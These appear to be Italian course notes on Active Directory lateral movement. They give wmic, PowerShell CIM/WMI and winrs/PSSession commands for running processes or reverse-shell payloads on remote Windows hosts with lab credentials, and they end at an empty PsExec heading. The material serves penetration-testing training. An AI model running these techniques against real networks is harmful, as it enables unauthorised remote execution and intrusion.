# 23.1. Active Directory Lateral Movement Techniques

## 23.1.1. WMI and WinRM

**WMI**

La prima tecnica di _lateral movement_ si basa su _Windows Management Instrumentation_ (WMI), una feature object-oriented che facilita la task automation. WMI è capace di creare processi tramite il metodo _Create_ della classe _Win32_Process_. Comunica attraverso RPC sulla porta 135 e utilizza un range di porte grande per i dati di sessione.

Ci sono due modi per seguire l'attacco:
1) Tramite _wmic_ (DEPRECATO!)
2) Tramite _Powershell_

Per creare un processo su un target remoto attraverso WMI occorrono le credenziali di un membro del gruppo locale _Administrators_, il quale potrebbe essere anche un domain user. 

Utilizzo dell'utility _wmic_ per creare un processo sul sistema remoto:

```bash
wmic /node:$IP_TARGET /user:$USERNAME /password:$PASSWORD process call create "$COMMAND_NAME"

Esempio:

wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

Questo comando dovrebbe ritornare il pid del processo e valore di ritorno pari a 0 (che conferma la corretta creazione del processo).

Di seguito viene mostrato come utilizzare _Powershell_ per eseguire l'attacco.

Creazione di un oggetto _PSCredential_ in _PowerShell_:

```
$username = '$USERNAME';
$password = '$PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

Creazione di una nuova _CimSession_:

```
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName $IP_TARGET -Credential $credential -SessionOption $Options
```

Payload:
- Utilizzare https://www.revshells.com/ per la generazione del payload.

```
$command = '$COMMAND_NAME';
```

![[payload.png]]

Creazione della sessione WMI attraverso _PowerShell_:

```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

Avvio di un listener sulla porta specificata nel payload.

**WinRM**

Anche WinRM può essere utilizzato per il remote host management. WinRM è la versione Microsoft del protocollo _WS-Management_ e scambia messaggi XML tramite HTTP e HTTPS. Utilizza la porta 5986 per il traffico HTTPS e la 5985 per HTTP.

Oltre alla sua implementazione in _PowerShell_, WinRM è implementato in diverse utility, come ad esempio _winrs_ (Windows Remote Shell).

Affinche WinRS funzioni, il domain user deve essere o all'interno del gruppo Administrators o del gruppo Remote Management Users sul host target.

Esecuzione di comandi remoti tramite WinRS:

```
winrs -r:$TARGET_HOST -u:$USERNAME -p:$PASSWORD  "$COMMAND"

Esempio:

winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
```

All'interno del comando è possibile inserire il payload precedentemente creato e avviare un listener sulla porta specificata.

Se si volesse utilizzare _Powershell_:

```
$username = '$USERNAME';
$password = '$PASSWORD';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

New-PSSession -ComputerName $TARGET_IP -Credential $credential
```

Per interagire con la sessione appena creata:

```
Enter-PSSession 1
```

## 23.1.2. PsExec





